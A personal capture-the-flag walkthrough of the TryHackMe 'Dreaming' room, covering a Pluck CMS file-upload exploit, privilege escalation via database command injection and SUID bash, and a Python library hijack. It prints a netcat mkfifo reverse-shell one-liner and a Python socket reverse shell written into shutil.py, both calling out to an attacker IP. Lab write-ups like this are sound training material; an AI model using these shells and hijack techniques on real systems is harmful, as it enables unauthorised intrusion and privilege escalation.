# THM-Dreaming
![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5997701d-4379-41d2-b2bc-e2f97f37c4f4)



Personal attempt on THM CTF Challenge. [DREAMING](https://tryhackme.com/room/dreaming)

**RECON**

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/084772cd-94f9-46ba-b317-6d805eaa61e6)

Access the target's website, we can only see Apache's default site. Let's do some directory enumeration with nmap and http-enum script. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/016a5d24-38de-470c-8170-120b0a79eab5)

Accessing the directoy, we know that the web is using Pluck CMS 4.7.13

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/48925c1d-2d60-4869-903a-3c3c75efb00a)

**EXPLOIT**

Upon a quick Google search, we can tell that this version of Pluck is vulnerable to an Authenticated File Upload, as documented in CVE-2020-29607. However, first we need to authenticate. 
With some luck, I was able to guess the password. It's password (not very secured 🔒)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/944c85b0-9e3d-4599-aeaa-10cd9273ee47)

The mentioned vulnerability allows an attacker to upload a web shell to the directory http://IP/admin.php?action=files to gain a web shell. This abuses the "manage files" functionality of the app.

I use this PoC from Github: https://github.com/0xAbbarhSF/CVE-2020-29607

`Usage: python3 exploit.py TARGET IP TARGET PORT password pluck-cms-path`

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5b4795d2-805a-4e65-b5ba-a046e22eeafc)

Now, for more control and convenience, we want a reverse shell. I like to use the methods from
[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

On your attack machine, start a Netcat listener on a random unused port.

`nc -lvnp 1234`

Then run this on the web shell

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

Remember to replace the IP with the IP of your attack machine. 

Wait a few a moment, then we receive a shell of the target machine as www-data. www-data is the owner of files under the web server directory.  

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/325565e4-6740-4f61-be04-977d00d318bb)

To gain a more stable shell, we can use the command:

`python3 -c 'import pty;pty.spawn("/bin/bash")`

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/d7cd8071-55ff-47ed-b56e-42da593972ef)

**PRIVILEGE ESCALATION**

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5e59087c-b25e-49f9-97dd-7ad1978fe37c)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/07a3dbb9-dee1-4bae-aaf0-164eac7ab22e)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/eac83ba7-0d52-4a95-aa16-d7d46a750ad8)

As you can see, www-data don't have read access to the flags so, to get the flags, we need to find ways to escalate to higher privileges. I am using [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)

To transfer it to the target machine, we can use the manage files nav bar (under Pages). Then script will be available at /var/www/html/files/linpeas.sh

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/05e6436c-6894-4ba0-b302-fee782a6f0be)


![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6b71812c-f6a9-4f57-a5fc-2278f753f47d)

Thanks to LinPEAS, we find some interesting files: 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6506e51b-dce4-4049-bf7b-ff6baf43a8f5)

**LUCIEN**

Opening the test.py, we found Lucien's password

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/b131a147-6ccb-4ea0-9b44-329fd18df755)

We can now SSH to the target using lucien's credentials. The flag is found under his home directory.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/49d3c69a-2c2d-4440-af22-a8cd8775df65)

**DEATH**
Using **sudo -l**, we see that Lucien can run a Python script as Death. It is know our job how to exploit this script to gain Death's shell

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/6bdd772a-4e5b-491d-b8de-cb39119fa926)

The script in /opt seems to be identical with the script that we're going to exploit. However, we only have read acess, so let's skim its content to see what it does. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/7cbf69a6-ebaa-48fa-89a3-555fccee0317)

First, a connection to the local mySQL database named 'library' was made. We can also see credentials of death, but the password was redacted.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/339f952f-77c0-4721-97ad-69240cbbe5c2)

Then the script fetches information from the 'dream' and the 'dreamer' column of the 'dreams' table.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/5667a4d8-9866-4a42-88c2-4d4c7aeeb237)

Finally, it echos a string concatenating the values. We can abuse this to inject shell commands into the database and get them executed under death. 

Opening .bash_history in lucien's home directory. We found lucien's mysql password. 
`mysql -u lucien -p????????????????`

Using lucien's credentials we were able to log in. 
Here's the content of the 'dreams' table:

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/577970a3-0247-4a98-8d48-9485d01fa63c)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/c4fbcb5d-af7b-423c-96f7-cff091c397af)

Using the ';' character, I was able to chain the echo command with the cat command to view death's flag. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/44be4445-b81b-4344-a53e-7a03fbe926ba)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/2e5c2e0f-2a5a-4ba1-9f81-1630a8eb4c0d)

Still, we haven't gained death's shell. To do that, we copy /bin/bash to /tmp/bash and add a SUID bit. Therefore, we will have access to death's shell. 

Return to MySQL, and injects the command. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/0f511983-4f1c-4f31-96c4-25fffc2f9690)

Run the script again, and we have death's shell.

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/7f0500c8-6526-494e-aa38-734b3e016262)

Remember the redacted password in getDreams.py in death's home dir? We can view it now. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/ee85ccc9-c82b-4774-86a5-243bde038271)

Luckily, we can reuse the DB password to ssh to the target for more stable shell. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/bf278b4e-12f3-4d9b-884b-f9b40f5f76c7)



**MORPHEUS**
Looking at Morpheus's directory, we can see a script "restore.py"

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/33f4e18c-4aaa-4899-b908-7dbdd33e2fa6)

Let's take a look at its content:

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/8bc9db4a-bb2e-49c8-adcd-b8b495b0d925)

From the code, it might be a backup script that invokes a method from another module named "shutil". 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/d35bd6bf-3e20-4292-a141-c1d48b742bd2)

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/ca28b26d-9610-4c16-a544-8aef44da6447)

shutil.py's attributes show that death has permission to modify the content of shutil. Knowing this, we can create a reverse shell back to our host machine. 


`echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.74.5",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > /usr/lib/python3.8/shutil.py`

So how are we running the restore.py script? Since this is a backup script, so it might be scheduled as a cron job. We can use [pspy](https://github.com/DominicBreuker/pspy?tab=readme-ov-file)) to verify. I used scp to transfer the binary to the target machine. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/44146d3d-ab29-40c0-bdf9-9db5e8e142a2)

Once we confirm that, let's open a Netcat listener and wait for the incoming shell. 

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/1146a224-6097-4aec-8f2f-bd73326d5c00)


Ladies and Gentleman, we got 'em

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/8e23a6a8-3781-44e1-b3e0-7f5449b9d86e)

And Morpheus also has root privileges:

![image](https://github.com/QuanPham247/THM-Dreaming/assets/97132705/f89bcb57-7e7f-4175-baa4-0c3b7fc8694b)


Sources:
  - https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python
  - https://github.com/DominicBreuker/pspy?tab=readme-ov-file
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet












